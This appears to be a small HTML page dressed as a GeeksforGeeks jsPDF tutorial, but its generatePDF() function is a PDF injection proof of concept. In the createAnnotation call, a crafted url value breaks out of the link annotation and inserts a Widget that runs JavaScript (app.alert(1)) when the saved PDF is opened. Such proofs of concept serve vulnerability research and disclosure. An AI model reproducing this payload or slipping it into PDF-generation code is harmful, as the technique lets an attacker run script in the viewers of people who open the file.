<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>
		jsPDF - Create PDFs with HTML5 JavaScript Library
	</title>
	<meta name="viewport"
		content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	<script src=
"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
	</script>
	<script src=
"https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js">
	</script>
</head>

<body>
	<h2 style="color:green">
		GeeksforGeeks
	</h2>
	<h3>
		Generate PDF file using jsPDF library
	</h3>
	<div class="container">				
		<input type="button" value="Create PDF"			
				onclick="generatePDF()">
	</div>

	<script type="text/javascript">
		function generatePDF() {
			const { jsPDF } = window.jspdf;
			var doc = new jsPDF();
			doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});
			doc.text(20, 20, 'Test text');
			doc.save("output2.pdf");
			}		
	</script>	
</body>
</html>
